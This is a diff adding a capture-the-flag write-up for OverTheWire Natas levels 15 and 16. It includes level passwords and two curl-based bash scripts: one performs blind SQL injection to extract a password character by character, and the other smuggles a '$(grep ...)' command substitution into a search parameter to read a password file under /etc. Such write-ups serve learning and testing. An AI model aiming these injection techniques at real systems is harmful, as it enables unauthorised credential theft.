@@ -324,3 +324,79 @@ The password condition will always be true, so we are returned natas15's passwor
 ```
 AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
 ```
+
+### [natas15](http://natas15.natas.labs.overthewire.org/)
+
+natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+Here we don't get the result of your SLQ queries, we only recieve wether or not our query returned any results. We can abuse this information to figure out the password.
+
+Let's just make sure our user is `natas16`, we input `natas16` and are told `This user exists`.
+
+now we're going to inject further conditions into our query, we'll basically be guessing the password one letter at a time by abusing the `like binary` sql keyword and the `%` wildcard. The following script does this with `curl`.
+
+```bash
+#!/usr/bin/env bash
+
+# run until the same password appears twice
+
+password='';
+echo "starting brute_force attack";
+
+while true; do
+for f in {a..z} {A..Z} {0..9}; do
+    curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16"%20and%20password%20like%20binary%20%22'$password$f'%' | grep exists
+    if [ $? -eq 0 ]
+    then
+       password=$password$f;
+       break
+    fi
+done
+echo $password;
+done
+```
+
+Once the script spits out the same password twice, we know we have the complete password.
+
+```
+WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+```
+
+### [natas16](http://natas16.natas.labs.overthewire.org/)
+
+natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
+
+We're back to the poorly secured `grep`s, this one now puts our key in quotes and filters for quotes and apostrophes before calling grep on it.
+
+We'll use a similar approach to the previous issue, we can inject a `grep` on the password file, we can't view the output of this grep, but if the grep succeeds then the grep on the dictionary will not return any results.
+
+So we append a word we know to be in our shell injection to the start of our query, then test grepping the password file until we don't get any results.
+
+here's a script that automates it in the same manner as the previous level
+
+```bash
+#!/usr/bin/env bash
+
+# run until the same password appears twice
+
+password='';
+echo "starting brute_force attack";
+
+while true; do
+for f in {a..z} {A..Z} {0..9}; do
+    curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 'http://natas16.natas.labs.overthewire.org/?needle=test%24(grep+^'$password$f'+%2Fetc%2Fnatas_webpass%2Fnatas17)&submit=Search' | grep smartest > /dev/null
+    if [ $? -ne 0 ]
+    then
+       password=$password$f;
+       break
+    fi
+done
+echo $password;
+done
+```
+
+Running this we eventually get our password
+
+```
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
